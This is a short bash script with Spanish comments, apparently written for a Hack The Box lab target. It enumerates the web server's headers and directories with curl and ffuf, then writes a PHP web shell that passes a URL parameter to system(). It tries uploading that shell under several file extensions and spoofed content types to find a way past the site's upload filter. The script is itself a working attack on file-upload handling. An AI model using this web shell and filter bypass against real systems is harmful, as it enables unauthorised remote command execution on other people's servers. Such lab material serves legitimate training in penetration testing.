#!/bin/bash
# Fase 03/04 - Enumeracion del portal research + test del filtro de subida
HOST="${1:-research.bedside.htb}"
echo "[*] Cabeceras:"; curl -s -I "http://$HOST/" | grep -iE 'server|powered'
echo "[*] Fuzzing de directorios:"
ffuf -u "http://$HOST/FUZZ" -w "$HOME/Documentos/diccionarios/ffuf/raft-medium-directories.txt" -mc 200,301,302,403 -s
echo "[*] Test del filtro de subida (contenido PHP con varias extensiones):"
echo '<?php system($_GET["c"]); ?>' > /tmp/payload.php
for combo in "shell.php:application/pdf" "shell.phtml:application/pdf" "shell.png:image/png"; do
  f="${combo%%:*}"; ct="${combo##*:}"
  msg=$(curl -s -F "uploadFile=@/tmp/payload.php;filename=$f;type=$ct" "http://$HOST/" | grep -oiE 'successfully|accepted formats' | head -1)
  printf "  %-14s [%s] -> %s\n" "$f" "$ct" "$msg"
done
